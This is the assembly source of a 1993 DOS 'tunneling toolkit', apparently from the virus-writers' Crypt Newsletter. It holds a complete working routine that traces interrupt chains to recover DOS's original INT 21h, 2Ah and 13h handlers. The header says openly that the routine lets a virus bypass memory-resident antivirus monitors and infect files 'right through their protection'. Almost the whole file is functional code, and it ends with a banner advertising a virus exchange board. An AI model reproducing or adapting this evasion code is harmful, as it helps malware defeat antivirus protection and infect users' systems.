;The Kohntark Tunneling Toolkit was originally rolled out in
;Crypt Newsletter 18.
;Recently, it was disassembled by Private Research, the complete
;listing of which is included below.
;
; From issue 18 of the newsletter:
;
;. . . A quick explanation: Antivirus system monitoring software are
;Terminate and Stay Resident (TSR) programs that remain in
;memory and hook or capture INT 21h / 2Ah / 13h and other
;vital system interrupts.
;         
;These programs monitor all calls made to these interrupts for
;'suspicious' or 'virus-like' behaviour. An example would be
;unauthorized writing to a file thought INT 21h, function 40h.
;
;These programs ensure that all viruses not using any
;tunneling or stealth routines are detected when trying to
;infect or remain resident in memory.
;
;Some examples of such programs will even monitor their own
;code to ensure they are not removed from memory or their
;INT 21h handler is not replaced by other programs.
;
;
;KRTT41 will get the DOS's original INT 21h / 2Ah / 13h, in
;most cases, and can turn your virus into a 'smart' one by
;warning about the possibility of strange AV software present
;in memory.
;
;Once DOS's original interrupts are found you can call them
;directly to memory freely, bypassing any AV software present
;in memory and infecting other files right through their
;protection!
;-----------------------------------------------------
;Private Research felt,
;"The KRTT41 is just an object version of the tunneling routine found
;in the Dudley virus . . ."
;
;This is interesting but we have no idea if the Dudley virus indeed
;uses the same mechanism, not having seen the original source code.
;A generous sort might consider giving it to us for comparative
;purposes - their own free No-Prize awaits.
;
;********************************************************************************
; KRTTdemo.ASM
; AUTHOR:      K”hntark
; DATE:        27 August 1993
;********************************************************************************

;***************************************************************
; TUNNEL 4.1 procedure usage:

; INPUT:   
;          bp=01                 => search for original INT 2Ah
;          bp=02                 => search for original INT 13h
;          any other value in bp => search for original INT 21h


; OUTPUT: ah=00  Not found 
;         ah=01  Found! 
;         ah=02  Int 21h / 2Ah / 13h  Not Hooked
;         ah=03  DOS internal interrupts are hooked
;         If found:
;         dx=    DOS INT 21h / 2Ah / 13h SEGMENT
;         di=    INT 21h  / 2Ah / 13h OFFSET
;         al=    RECURSION DEPT
; DESTROYED: ax,bx,cx,dx,di,bp,es
;***************************************************************

        .model tiny

        .code

        org    100h

START:
         mov  ah,09                            ;otherwise ...
         lea  dx,[FIRST_MSG]                   ;display KREATOR's msg
         int  21h
         
         push es                              ;save necessary registers
         call TUNNEL                          ;call TUNNELING ENGINE
         pop  es                              ;restore necessary registers
         
         mov  cx,ax                           ;save return codes
         mov  ah,09                           ;print found message
         
         cmp  ch,00                           ;was int 21h found?
         je   NOT_FOUND
         
         cmp  ch,03                           ;TROUBLE?
         je   TROUBLE
         
         mov  bp,dx                           ;bp=int 21h segment, di = offset
         
         cmp  ch,02                           ;was int 21h found?
         je   NOT_HOOKED

         cmp  ch,01                           ;is int 21h hooked?
         jne  TROUBLE

         lea  dx,[FOUND_MSG]
         int  21h
         
         lea  dx,[OFFSET_MSG]                 ;display header
         int  21h

         mov  bx,di                           ;display offset found
         call BIN_TO_HEX

         lea  dx,[SEGMENT_MSG]                ;display header       
         int  21h

         mov  bx,bp                           ;display segment found
         call BIN_TO_HEX
              
         lea  dx,[RECURSION_DEPT_MSG]         ;display header       
         int  21h

         and  cx,000FFh                       ;cx=cl
         mov  bx,cx                           ;recursion dept count
         call BIN_TO_HEX

         int  20h                             ;exit


NOT_HOOKED:     lea  dx,[OK_MSG]
                int  21h
                int  20h

NOT_FOUND:      lea  dx,[SAD_MSG]
                int  21h
                int  20h

TROUBLE:        lea  dx,[TROUBLE_MSG]
                int  21h
                int  20h

;*****************************************************************************

BIN_TO_HEX:
            push cx       ;save registers
            push dx
            push ax

            mov  ch,04    ;# of digits to process
ROTATE:     mov  cl,04    ;# of bits to rotate
            rol  bx,cl    ;rotate bx l to r
            mov  al,bl    ;move to al  (2 digits)
            and  al,0Fh   ;mask off upper digit
            add  al,30h   ;convert to ASCII
            cmp  al,3Ah   ;is it > 9?
            jl   PRINTIT  ;jump of digit =0 to 9
            add  al,07h   ;digit is A to F
PRINTIT:
            mov dl,al
            mov ah,2     ;INT 21h function
            int 21h      ;print character
            dec ch
            jnz ROTATE

            pop  ax      ;restore registers
            pop  dx
            pop  cx
            ret

;****************************************************************************

FIRST_MSG      db  'ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ',13d,10d
               db  '  K”hntarK',027h,'s Tunneling Toolkit  ',13d,10d
               db  '    Version 4.1 DEMO (C) 1993   ',13d,10d
               db  'ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ',13d,10d,13d,10d,'$'

OK_MSG             db  'INT 21h not hooked. ',13d,10d,'$'
FOUND_MSG          db  'ORIGINAL INT 21h FOUND! ',13d,10d,'$'
OFFSET_MSG         db  'INT 21h OFFSET FOUND:  ','$'
SEGMENT_MSG        db  13d,10d,'INT 21h SEGMENT FOUND: ','$'
SAD_MSG            db  'COULDN',027h,'T FIND INT 21h ! ',13d,10d,'$'
RECURSION_DEPT_MSG db  13d,10d,'RECURSION DEPT: ','$'
TROUBLE_MSG        db  'Internal DOS interrupts hooked ',13d,10d,'$'

INT_21_OFF         dw  0      
INT_21_SEG         dw  0      

tunnel:
                cli
                xor     ax,ax
                mov     es,ax                   ;ES=0
                xor     di,di
                mov     dx,es:[0aeh]
                mov     cx,es:[0a2h]
                cmp     dx,cx
                je      trace_possible          ;are the two vectorsegments
                                                ;equal? If so, it probably
                                                ;means we have the correct
                                                ;dos segment
                mov     cx,es:[0b2h]    
                cmp     dx,cx
                je      trace_possible          ;these two perhaps?
                mov     ah,3                    ;If not, then DOS's
                                                ;internal vectors are hooked
                                                ;so tunneling this way is
                                                ;out of the question.
                ret

trace_possible:
                cmp     bp,1
                jz      int2a                   ;search for int 2a
                cmp     bp,2
                jz      int13                   ;search for int 13
                
                mov     bx,es:[84h]
                mov     es,es:[86h]             ;Tunnel int21
                jmp     check_hooked
int2a:
                mov     bx,es:[4ch]
                mov     es,es:[4eh]
                mov     bp,es
                mov     dx,70h
                cmp     bp,dx
                je      no_trace
                jmp     hooked
int13:
                mov     bx,es:[0a8h]
                mov     es,es:[0aah]

check_hooked:                
                mov     bp,es
                cmp     dx,bp
                jne     hooked                  ;See if interrupt is hooked
                                                ;at all
no_trace:
                xchg    bx,di                   ;Just put input vector
                                                ;into output vector
                mov     ah,2                    ;'Wasn't hooked' action
                                                ;code
                ret                             ;Return to caller

hooked:                
                call    trace
                sti
                ret
                
trace:                
                push    es
                push    bx                      ;Save pointer.
                
                cmp     al,7                    ;Check for maximum
                                                ;recursion depth.
                je      quit_trace
                cmp     ah,1
                je      quit_trace
                inc     al                      ;Inc recursion depth.
                
                mov     cx,0FFFAh               ;FFFF-the 4 bytes of which
                                                ;an address consists.
                sub     cx,bx                   ;Adjust to bytes left
                                                ;in segment from starting
                                                ;point BX.

findopcodeloop:                
                push    bx
                cmp     byte ptr es:[bx],0E8h
                je      skipcallnear            ;CALL NEAR opcode
                cmp     byte ptr es:[bx],0EAh
                je      addressfound            ;JMP FAR opcode
                cmp     byte ptr es:[bx],9Ah
                je      addressfound            ;JMP FAR opcocde
                
                cmp     byte ptr es:[bx],2Eh
                jne     makesomedecisions
                cmp     byte ptr es:[bx+1],0FFh
                jne     makesomedecisions
                cmp     byte ptr es:[bx+2],1Eh
                je      memreferencefound
                cmp     byte ptr es:[bx+2],2Eh
                jne     makesomedecisions       ;This block checks
                                                ;for a JMP FAR or
                                                ;CALL FAR with a memory
                                                ;reference.
memreferencefound:
                mov     bp,es:[bx+3]
                dec     bp
                xchg    bx,bp
                jmp     short addressfound

makesomedecisions:
                pop     bx
                cmp     ah,1
                je      quit_trace              ;Address found
                cmp     al,7
                je      quit_trace              ;Maximum recursion depth
                                                ;reached. Give up.
                inc     bx
                loop    findopcodeloop

skipcallnear:                
                pop     bx
                add     bx,3                    ;Skip call address
                loop    findopcodeloop          ;continue

quit_trace:                
                pop     bx
                pop     es
                ret

addressfound:                
                pop     bp
                add     bp,4
                push    bp
                cmp     es:[bx+3],dx            ;Is the segment alright?
                je      vectorfound
                cmp     word ptr es:[bx+3],0    ;Is the segment zero?
                je      makesomedecisions 
                push    es
                pop     bp
                cmp     es:[bx+3],bp
                je      makesomedecisions
                mov     bp,bx
                mov     bx,es:[bx+1]
                mov     es,es:[bp+3]
                call    trace
                jmp     makesomedecisions

vectorfound:
                mov     di,es:[bx+1]            ;load proper offset
                                                ;into di (return reg)
                mov     ah,1                    ;ah=1 means found
                jmp     makesomedecisions       ;And quit tracing routine.


                END START

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.547477 H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
